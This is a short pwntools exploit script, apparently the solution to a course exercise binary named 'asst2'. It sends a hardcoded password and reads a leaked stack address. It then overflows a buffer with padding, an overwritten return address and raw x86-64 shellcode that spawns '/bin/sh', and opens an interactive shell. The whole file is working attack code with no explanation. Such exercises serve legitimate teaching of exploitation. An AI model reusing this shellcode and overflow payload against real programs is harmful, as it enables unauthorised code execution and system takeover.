from pwn import *
#basic_shell.asm
shellcode = b"\xb8\x3b\x00\x00\x00\xbb\x00\x00\x00\x00\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05"

io = process("./asst2")
io.sendline("Nihaal")# send password
io.recvline()
io.recvline()
addr = int(io.recvline(),16)# cast leaked address from str to hex
addr = p64(addr + 8 + 8 + 8)# "Nihaal\n\00" + base addr + ret addr

#gdb.attach(io,"b *main+170")
payload = b"A"*26 + addr + shellcode
io.sendline(payload)
io.interactive()


